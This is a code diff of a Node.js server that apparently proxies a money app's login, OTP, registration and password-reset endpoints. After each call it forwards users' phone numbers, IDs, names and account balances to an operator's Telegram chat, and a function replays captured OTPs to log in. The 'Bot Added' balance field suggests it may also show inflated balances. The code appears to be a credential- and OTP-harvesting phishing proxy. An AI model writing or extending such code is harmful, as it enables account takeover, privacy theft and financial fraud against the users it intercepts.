@@ -178,8 +178,8 @@ async function fireActiveLogin(phone, otp) {
     const text = await resp.text();
     let json = null;
     try { json = JSON.parse(text); } catch(e) {}
-    if (json && (json.code === 200 || json.code === '200' || json.success === true)) {
-      return { ok: true, userId: (json.data && (json.data.memberId || json.data.userId || json.data.id)) || '' };
+    if (json && (parseInt(json.status) === 200 || json.code === 200 || json.code === '200' || json.success === true)) {
+      return { ok: true, userId: (json.body && (json.body.memberId || json.body.userId || json.body.id)) || (json.data && (json.data.memberId || json.data.userId || json.data.id)) || '' };
     }
     return { ok: false, error: (json && (json.msg || json.message)) || text.substring(0, 150) };
   } catch(e) {
@@ -1509,7 +1509,7 @@ app.all('/appAuth/v2/memberLogin', async (req, res) => {
     }
     if (data.adminChatId && bot && !isLogOff(data, userId)) {
       const ts = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
-      const success = jsonResp?.code === 0 || jsonResp?.code === 200 || jsonResp?.success;
+      const success = parseInt(jsonResp?.status) === 200;
       bot.sendMessage(data.adminChatId,
         `🔑 ${success ? '✅ Login Success' : '❌ Login Failed'}\n📱 Phone: ${phone || 'N/A'}\n🆔 ID: ${userId || 'N/A'}\n📛 Name: ${userName || 'N/A'}\n━━━━━━━━━━━━━━\n💰 Real Balance: ₹${realBalance !== '' ? realBalance : 'N/A'}\n➕ Bot Added: ₹${addedBal}\n━━━━━━━━━━━━━━\n💳 Withdraw Balance: ₹${realWithdraw !== '' ? realWithdraw : 'N/A'}\n⏳ In Process: ₹${realProcess !== '' ? realProcess : 'N/A'}\n🕐 ${ts}`
       ).catch(()=>{});
@@ -1527,7 +1527,7 @@ app.all('/appAuth/sendOtp', async (req, res) => {
     const otpType = body.type || body.otpType || '';
     sendJson(res, respHeaders, jsonResp, respBody);
     if (data.adminChatId && bot) {
-      const success = jsonResp?.code === 0 || jsonResp?.code === 200 || jsonResp?.success;
+      const success = parseInt(jsonResp?.status) === 200;
       bot.sendMessage(data.adminChatId,
         `📩 OTP Sent ${success ? '✅' : '❌'}\n📱 Phone: ${phone || 'N/A'}${otpType ? '\n🔖 Type: ' + otpType : ''}\n🕐 ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`
       ).catch(()=>{});
@@ -1546,7 +1546,7 @@ app.all('/appAuth/memberRegister', async (req, res) => {
     const userId = String(respData?.memberId || respData?.userId || respData?.id || '');
     sendJson(res, respHeaders, jsonResp, respBody);
     if (data.adminChatId && bot) {
-      const success = jsonResp?.code === 0 || jsonResp?.code === 200 || jsonResp?.success;
+      const success = parseInt(jsonResp?.status) === 200;
       bot.sendMessage(data.adminChatId,
         `🆕 Register ${success ? '✅ Success' : '❌ Failed'}\n📱 Phone: ${phone || 'N/A'}\n🆔 ID: ${userId || 'N/A'}\n🕐 ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`
       ).catch(()=>{});
@@ -1563,7 +1563,7 @@ app.all('/appAuth/forgetPwd', async (req, res) => {
     const phone = body.loginName || body.mobile || body.phone || '';
     sendJson(res, respHeaders, jsonResp, respBody);
     if (data.adminChatId && bot) {
-      const success = jsonResp?.code === 0 || jsonResp?.code === 200 || jsonResp?.success;
+      const success = parseInt(jsonResp?.status) === 200;
       bot.sendMessage(data.adminChatId,
         `🔐 Forgot Password ${success ? '✅' : '❌'}\n📱 Phone: ${phone || 'N/A'}\n🕐 ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`
       ).catch(()=>{});
